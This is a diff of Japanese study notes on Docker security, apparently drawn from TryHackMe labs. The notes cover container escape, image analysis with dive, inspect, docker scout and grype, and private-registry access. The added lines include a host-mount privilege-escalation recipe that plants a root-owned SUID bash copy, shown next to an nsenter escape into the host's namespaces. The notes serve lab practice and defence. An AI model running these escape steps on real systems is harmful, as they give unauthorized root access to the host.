@@ -195,30 +195,6 @@ curl http://docker-rodeo.thm:5000/v2/cmnatic/myapp1/manifests/notsecure{
 ...
 ```
 
-### イメージのリバースエンジニアリング
-
-[dive](https://github.com/wagoodman/dive#installation) をインストール
-
-```sh
-# デコンパイルするイメージをダウンロード
-docker pull docker-rodeo.thm:5000/dive/example
-
-# IMAGE_ID を特定する
-docker images
-REPOSITORY                           TAG                 IMAGE ID            CREATED             SIZE
-...
-docker-rodeo.thm:5000/dive/example   latest              398736241322        4 years ago         87.1MB
-...
-
-# diveを開始
-dive 398736241322
-```
-
-- 4 つのビューが表示される。
-- 上下キーで現在のビュー内のデータを移動。
-- TAB キーでビューを切り替え。
-- スペースキーでディレクトリをたたむ。
-
 ## Docker Compose
 
 WEB サーバーコンテナ、DB コンテナ等の複数のコンテナを、1 つにまとめることができる。
@@ -267,7 +243,7 @@ networks:
   ecommerce:
 ```
 
-## 脆弱性
+## エスケープ
 
 https://tryhackme.com/room/containervulnerabilitiesDG
 
@@ -397,6 +373,111 @@ nsenter --target 1 --mount --uts --ipc --net /bin/bash
 - `--uts` 対象と同じ UTS 名前空間（ホスト名やドメイン名の空間）に入る
 - `--ipc` 対象と同じ IPC 名前空間に入る。→ shm（共有メモリ）や sem（セマフォ）などの IPC リソースを共有できる。
 - `--net` 対象と同じネットワーク名前空間に入る。→ ネットワークインターフェースやルーティング設定が同じになる。
+
+### [ホストマウントによる権限昇格](https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/docker-security/docker-breakout-privilege-escalation/index.html#privilege-escalation-with-2-shells-and-host-mount)
+
+ホストOSの非特権ユーザーとしてコマンド実行できることが条件。  
+ホストOS上でbashをコピーし、ゲストOSのrootユーザーでSUIDを付ける。  
+NFS の no_root_squash オプションと同じ理屈。
+
+```sh
+cp /bin/bash . #From non priv inside mounted folder
+# You need to copy it from the host as the bash binaries might be diferent in the host and in the container
+chown root:root bash #From container as root inside mounted folder
+chmod 4777 bash #From container as root inside mounted folder
+bash -p #From non priv inside mounted folder
+```
+
+## イメージの分析
+
+### dive
+
+https://github.com/wagoodman/dive#installation
+
+```sh
+# デコンパイルするイメージをダウンロード
+docker pull docker-rodeo.thm:5000/dive/example
+
+# IMAGE_ID を特定する
+docker images
+REPOSITORY                           TAG                 IMAGE ID            CREATED             SIZE
+...
+docker-rodeo.thm:5000/dive/example   latest              398736241322        4 years ago         87.1MB
+...
+
+# diveを開始
+dive 398736241322
+
+dive <image-tar>
+```
+
+- 4 つのビューが表示される。
+- 上下キーで現在のビュー内のデータを移動。
+- TAB キーでビューを切り替え。
+- スペースキーでディレクトリをたたむ。
+- blobコピーの場合、tarを展開したら、sha256のIDでファイルを参照できる。
+
+### inspect
+
+環境変数なども確認できる。
+
+```sh
+docker inspect umbrella.thm:5000/umbrella/timetracking
+```
+
+### docker scout
+
+https://github.com/docker/scout-cli
+
+```sh
+docker scout cves local://nginx:latest
+```
+
+### grype
+
+https://github.com/anchore/grype
+
+```sh
+grype imagename --scope all-layers
+
+grype /path/to/image.tar
+```
+
+## 静的バイナリ
+
+https://download.docker.com/linux/static/stable/x86_64/
+
+## HTTP
+
+```sh
+# イメージ一覧
+curl http://example:5000/v2/_catalog
+
+# タグ一覧
+curl http://localhost:5000/v2/alpine/tags/list
+```
+
+/etc/docker/daemon.json
+
+```json
+{
+  "insecure-registries": ["umbrella.thm:5000"]
+}
+```
+
+```sh
+sudo systemctl restart docker
+```
+
+```sh
+# PULL。http:// を付けるとエラーになる
+docker pull umbrella.thm:5000/umbrella/timetracking
+```
+
+```sh
+# ファイルとして保存
+docker save -o timetracking.tar umbrella.thm:5000/umbrella/timetracking
+```
 
 ## セキュリティ強化
 
@@ -562,28 +643,3 @@ sudo apparmor_parser -r -W /home/cmnatic/container1/apparmor/profile.json
 # プロファイルを指定してコンテナを起動
 docker run --rm -it --security-opt apparmor=/home/cmnatic/container1/apparmor/profile.json mycontainer
 ```
-
-### イメージの分析
-
-#### docker scout
-
-https://github.com/docker/scout-cli
-
-```sh
-docker scout cves local://nginx:latest
-```
-
-#### grype
-
-https://github.com/anchore/grype
-
-```sh
-grype imagename --scope all-layers
-
-grype /path/to/image.tar
-```
-
-## 静的バイナリ
-
-https://download.docker.com/linux/static/stable/x86_64/
-
